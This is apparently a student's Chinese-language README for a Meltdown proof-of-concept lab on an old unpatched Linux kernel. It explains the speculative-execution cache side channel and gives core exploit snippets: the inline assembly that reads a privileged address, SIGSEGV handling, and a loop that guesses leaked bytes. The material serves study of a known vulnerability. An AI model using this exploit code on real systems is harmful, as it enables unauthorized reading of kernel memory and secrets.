# Meltdown 
## 综述
+ ./melt.sh命令可以查看演示效果
+ 运行这个演示需要临时提权
+ 操作系统的kaslr机制每次启动会更改内核的位置，所以必须sudo获得权限找到越权访问的地址，但主体的核心代码不需要root权限
+ 我的实验环境为：操作系统Ubuntu 16.04，内核Linux4.10.0-28 generic
## 关于补丁
我的内核版本较老，没有安装补丁，可以直接进行实验。
## 攻击原理
CPU有着分支预测功能，在我们读取一个非法地址（没有读取权限）时，会产生段错误，但读取指令后的几条指令也会被执行（当错误发生后，执行的操作会被撤销）。然而，预测执行时读入Cache的页并没有被取出，仍然留在Cache中，这就导致之后读取这一页时会加速。我们将从非法地址读到的值作为读入Cache的页的页码，之后只要读取各页，最快的那一页的页码就是我们从非法地址读到的值。这就是说，我们从内存中窃取了数据————这就是meltdown的攻击原理。
## 错误的处理
在使用meltdown漏洞时，我们将主动制造段错误，并利用CPU的预测执行将对应地址的内容读入cache，这时候就存在一个问题：一般而言，在我们遭遇段错误时，C程序就会被强制结束，我们将无法利用预先读入cache的内容。这个时候，我们需要类似于java的try-catch机制的错误处理程序。  
来自于setjmp.h库的函数sigsetjmp()及siglongjmp()可以完成这个任务，利用宏定义可以产生类似的效果：
```C
#define try if(!sigsetjmp(Jump_Buffer,1))  
#define catch else  
#define throw siglongjmp(Jump_Buffer,1)  
```
但是段错误不同于一般的错误，可以在代码中利用分支抛出错误。查阅资料，可以知道发生段错误后系统会抛出SIGSEGV信号，之后调用默认的信号处理函数，产生core文件，然后关闭程序。因此，如果我们可以捕获这个信号，就可以调用自行实现的信号处理函数了。函数signal()可以完成注册信号处理函数的任务。
## 核心代码
攻击的核心代码是一段内联汇编。
```C
asm volatile (//volatile让编译器不会优化这段代码
    /*作用是进行一定的延时保证变量进入cache*/
        ".rept 100\n\t"
        "add $0x100, %%rax\n\t"
        ".endr\n\t"
    /*
    试探读取字符，当然在movzx这里本应该失败，但是预读取会使这三段代码都会执行。
    第一行读取被攻击的地址的内容;
    第二行是将读取值乘上pagesize，即左移12位;
    第三行尝试读取test数组的一页，页码是最初的读取值，CPU会将这一页放入cache。
    */
        "movzx (%[addr]), %%rax\n\t"
        "shl $12, %%rax\n\t"
        "mov (%[target], %%rax, 1), %%rbx\n"
        :
        : [target] "r" (test),
          [addr] "r" (addr)
        : "rax","rbx"
    );	
```
## 动态次数猜测方法
在使用meltdown漏洞的实践中，可以发现，如果对一个地址只进行一次攻击，得到的结果正确率很低。如果对一个地址进行多次攻击，将被猜测最多的值作为最终结果，可以显著提高正确率（经实践，一般1000次左右效果较好）。然而，这显然会降低窃取内存数据的效率。因此，采用动态次数猜测方法，可以在保证正确率的前提下，大幅提高效率。
```C
while (p[max1]<=2*p[max2]+20){
    /*采用动态次数猜测方法。只有当最高页分数大于次高页分数的两倍加20分时，才确信最高页的页码是我们想要窃取的值。*/
    readbyte(fd,addr);
    tmp=loadpage();
    p[tmp]++;//被猜测的页的分数加1
    if (tmp!=max1){
       	if (p[tmp]>p[max1]) {
       		max2=max1;
       		max1=tmp;	
      	}
       	else if (p[tmp]>p[max2]) {
       		max2=tmp;
      	}
    }//修改最高和次高页的页码			
}
```
由于每次攻击的结果是比较随机的，数据有好有坏。如果采用固定次数的方法，次数就应当满足数据最差时（这种情况不普遍）的要求，对于数据较好时，就是一种浪费。而采取动态次数的方法，数据好的时候次数少，差的时候次数多，减少了浪费，提高了效率。
## 实验结果
![图片](./1.png?raw=true)  
![图片](./2.png?raw=true)  
![图片](./3.png?raw=true)  
![图片](./4.png?raw=true)  
![图片](./5.png?raw=true)  
## 参考资料
+ https://blog.csdn.net/qq_25827741/article/details/78994970
+ https://blog.csdn.net/tian_dao_chou_qin/article/details/6386621
+ https://github.com/paboldin/meltdown-exploit